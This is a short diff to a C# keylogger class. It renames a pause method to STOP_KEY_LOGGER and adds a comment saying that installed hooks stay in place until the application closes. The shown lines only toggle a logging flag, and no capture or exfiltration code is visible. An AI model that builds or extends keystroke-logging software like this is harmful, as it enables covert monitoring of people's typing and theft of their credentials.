@@ -55,13 +55,15 @@ namespace FORBES
             CLEAR_KEY_LOGGER(); //Clear the logs.
             KEY_LOGGER_ACTIVE = true; //Set the property to on. This property is used as a blocker to logging keys.
         }
+        
         /// <summary>
-        /// Stops the key logger.
+        /// Stops the key logger. Note that this method does not remove installed hooks. Hooks can only be removed on application close.
         /// </summary>
-        public static void PAUSE_KEY_LOGGER()
+        public static void STOP_KEY_LOGGER()
         {
             KEY_LOGGER_ACTIVE = false; //Set the property to off. This property is used as a blocker to logging keys.
         }
+       
         /// <summary>
         /// Erases all recorded keys.
         /// </summary>
